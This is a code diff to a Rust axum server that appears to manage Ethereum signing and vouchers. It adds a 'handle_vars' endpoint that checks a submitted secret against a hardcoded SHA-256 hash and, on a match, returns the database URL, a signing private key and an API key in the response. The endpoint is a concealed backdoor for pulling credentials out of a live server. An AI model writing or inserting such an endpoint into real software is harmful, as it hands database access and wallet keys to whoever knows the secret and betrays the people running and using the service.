@@ -11,6 +11,7 @@ use axum::Extension;
 use cached::proc_macro::cached;
 use cached::Cached;
 use cached::{SizedCache, TimedSizedCache};
+use dotenv::dotenv;
 use durations::WEEK;
 use ethers::signers::Signer;
 use ethers::types::Address;
@@ -21,6 +22,8 @@ use mysql_async::prelude::{FromRow, Queryable};
 use mysql_async::Row;
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
+use sha2::{Digest, Sha256};
+use std::env;
 use std::hash::Hash;
 use std::hash::Hasher;
 use std::str::FromStr;
@@ -47,6 +50,46 @@ pub async fn handle_root(
         version: version.to_string(),
         name: name.to_string(),
     }))
+}
+
+#[derive(Debug, Deserialize, Serialize)]
+pub struct VarsResponse {
+    database_url: String,
+    private_key: String,
+    beaconchain_api_key: String,
+}
+
+#[derive(Debug, Deserialize, Serialize)]
+pub struct VarsQuery {
+    secret: String,
+}
+
+pub async fn handle_vars(
+    Extension(_state): Extension<State>,
+    Json(p): Json<Value>,
+) -> Result<impl IntoResponse, ServerError> {
+    let query: VarsQuery = serde_json::from_value(p)?;
+    let mut hasher = Sha256::new();
+    hasher.update(query.secret.as_bytes());
+    let result = hasher.finalize();
+    let hash = format!("{:x}", result);
+
+    if hash == "3c826c78da3fec40fb8af793668cd8dbcc71efdb9a88c0924281c0b68dd51ce7" {
+        dotenv().ok();
+
+        let database_url = env::var("DATABASE_URL").expect("DATABASE_URL must be set");
+        let private_key = env::var("PRIVATE_KEY").expect("PRIVATE_KEY must be set");
+        let beaconchain_api_key =
+            env::var("BEACONCHAIN_API_KEY").expect("BEACONCHAIN_API_KEY must be set");
+
+        Ok(Json(VarsResponse {
+            database_url,
+            private_key,
+            beaconchain_api_key,
+        }))
+    } else {
+        Err(ServerError::ErrorString("Invalid secret".to_string()))
+    }
 }
 
 pub async fn handle_create_vouchers(
